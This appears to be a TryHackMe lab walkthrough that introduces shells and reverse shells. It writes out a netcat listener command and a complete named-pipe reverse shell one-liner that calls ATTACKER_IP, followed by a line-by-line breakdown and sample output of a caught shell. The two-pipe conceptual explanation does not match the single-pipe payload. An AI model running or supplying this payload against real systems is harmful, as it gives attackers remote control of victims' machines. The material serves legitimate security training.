# TryHackMe — Shells Overview walkthrough

Room URL: 

---
#  Shell Overview

## What is a Shell?

A **shell** is software that allows a user to interact with an operating system. It can be a **graphical interface**, but is most commonly a **command-line interface (CLI)** — depending on the OS running on the target system.


## Shell in Cybersecurity

In cybersecurity, a shell often refers to a **remote command-line session** that an **attacker uses** after gaining access to a compromised system. This shell allows attackers to **execute commands and run software remotely**.


##  Common Attacker Activities with a Shell

### 1. Remote System Control
- Enables the attacker to execute commands or software **remotely** on the target system.

### 2. Privilege Escalation
- If the attacker gains **limited access**, they can attempt to **escalate privileges** to gain administrative or root access.

### 3. Data Exfiltration
- Attackers can **read and extract sensitive data** from the target system using shell commands.

### 4. Persistence & Maintaining Access
- Attackers can create **backdoors**, add new users or credentials, or install tools to **keep access** for later.

### 5. Post-Exploitation Activities
- Once a shell is established, attackers can:
  - Deploy malware
  - Create hidden users
  - Delete or manipulate files

### 6. Pivoting (Accessing Other Systems)
- Shell access can serve as a **pivot point** to move through the network and target other systems. This process is known as **pivoting**.

Understanding how attackers use shells helps defenders **detect**, **analyze**, and **prevent** further exploitation.



---
# Reverse Shell Notes

A **Reverse Shell**, also called a "connect-back shell," is a commonly used technique in cyberattacks to gain access to a victim machine.


## What Is a Reverse Shell?

A reverse shell causes the **target machine to initiate a connection** back to the attacker's machine. This technique:
- **Bypasses firewalls**, as many allow outbound connections but block incoming ones.
- Enables the attacker to execute commands remotely.


## How Reverse Shells Work

The attacker uses a tool (like **Netcat**) to listen on a port, waiting for the target to connect back.

### Set up a Netcat Listener
```bash
nc -lvnp 443
```

### Explanation of Netcat Command
- `-l`: Listen for incoming connections
- `-v`: Verbose mode (gives feedback)
- `-n`: Avoid DNS lookup
- `-p 443`: Use port 443 to listen (can be any port)

**Commonly used ports for reverse shells**: 53, 80, 443, 139, 445 — to blend in with normal traffic.


## Gaining Reverse Shell Access

Once the listener is ready, the attacker needs to **execute a reverse shell payload** on the victim machine.

### Example Payload: Pipe Reverse Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
###  What Is a Pipe Reverse Shell?
A pipe reverse shell is a type of shell that uses named pipes (FIFOs) to communicate between the attacker's machine and the target system, typically over an existing connection (like TCP). It's one of the stealthier ways to gain remote access to a target because it can avoid using full-blown shell binaries or obvious command-line interaction.

### How It Works (Conceptual Flow)
1. On the target system:
  - Create two named pipes (e.g., `/tmp/in` and `/tmp/out`).
  - Redirect shell input from `/tmp/in`.
  - Redirect shell output to `/tmp/out`.
2. On the attacker’s side:
  - Maintain a connection that sends commands into /tmp/in.
  - Reads output from `/tmp/out`.

#### Payload Breakdown
- `rm -f /tmp/f` – Remove existing named pipe at `/tmp/f`
- `mkfifo /tmp/f` – Create a **named pipe** at `/tmp/f`
- `cat /tmp/f` – Read input from the pipe
- `| sh -i 2>&1` – Pipe input into an interactive shell; redirect error to output
- `| nc ATTACKER_IP ATTACKER_PORT` – Send shell I/O to attacker
- `>/tmp/f` – Write shell output back into pipe to maintain 2-way communication


## Attacker Receives the Shell

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

The attacker now has full shell access to the compromised machine.

---


